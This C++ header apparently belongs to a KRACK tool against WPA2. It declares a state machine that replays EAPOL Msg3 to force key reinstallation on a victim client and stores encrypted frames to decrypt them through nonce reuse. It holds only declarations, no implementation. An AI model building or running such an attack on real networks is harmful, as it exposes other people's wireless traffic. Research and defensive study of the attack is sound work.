#ifndef KRACKSTATE_H__
#define KRACKSTATE_H__

#include <stdint.h>
#include <vector>
#include "ieee80211header.h"
#include "crypto.h"

/** Number of arrays which hold the encrypted packets */
#define PKT_LINES 2

/** Collect X data frames before replaying Msg3 */
#define DATA_FRAMES_COLLECTION_LIMIT 3

enum attack_state
{
	NON_RCVD,
	MSG1_RCVD,
	MSG2_RCVD,
	MSG3_RCVD,	// Msg3 received but not forwarded
	MSG3_FWD,	// Msg3 forwarded
	MSG4_RCVD,	// Msg4 received but not forwarded
	MSG4_FWD	// Msg4 forwarded, key could be installed on authenticator
};

class ClientInfo; // Forward declaration

/**
 * The class holds the state of a krack attack for unencrypted EAPOL Msg3. This includes for example:
 * State of the attack, captured encrypted packets, decryption attempts, the plaintext for it etc.
 */
class KrackState
{
public:
	KrackState(ClientInfo *cli) { client = cli; }

	/** Counts number of times the key has been reinstalled on the victim. */
	uint8_t key_reinstall_counter = 0;
	/** Tracks which EAPOL messages/frames has been received and sent. */
	attack_state state = NON_RCVD;

	/** Analyse and handle packet
	 *
	 * Returns values:
	 * < 0	error occured
	 * = 0	don't forward packet
	 * > 0	length of the (possibly modified) packet to forward
	 */
	int handle_packet(uint8_t *buf, size_t plen);
	/** Appends a captured packet to the currently used packet line */
	void save_ccmp_pkt(ccmp_pkt* pkt);
	/** Store a EAPOL frame into its buffer
	 * 
	 * Return values:
	 * -1 error occured
	 * 1-4 frame number of eapol packet 
	 */
	int save_eapol_msg(uint8_t *buf, size_t plen, eapol_update *eapol);


	int replay_msg3(wi_dev *dev);

	/** Number of collected data frames per pkt line. */
	size_t num_coll_pkts = 0;

	/** decrypt packets against some plaintext packets */
	int decrypt_pkts();

	/** Buffer for EAPOL Msg3 and Msg4 frames to replay them later. */
	std::vector<raw_ieee80211pkt> msg3_buf;
	std::vector<raw_ieee80211pkt> msg4_buf;

	/** Encrypted packets, captured after each reinstall of the key.
	 * Useful for immidiate decryption attempts
	 */
	std::vector<ccmp_pkt> ccmp_pkt_lines[PKT_LINES];

	/** Index of currently used encrypted packet line */
	uint8_t curr_line = 15;

private:
	/**
	 * Pointer to client
	 */
	ClientInfo *client;

	/** Last seen packet number used for ccmp nonce. */
	uint64_t last_pn = 0;

	uint8_t icmp_pkt[100] = {0};

	/** XORed plaintext packets, formely encrypted with the same nonce */
	std::vector<ccmp_xored_pkt> xored_pkts;
};

#endif //KRACKSTATE_H__
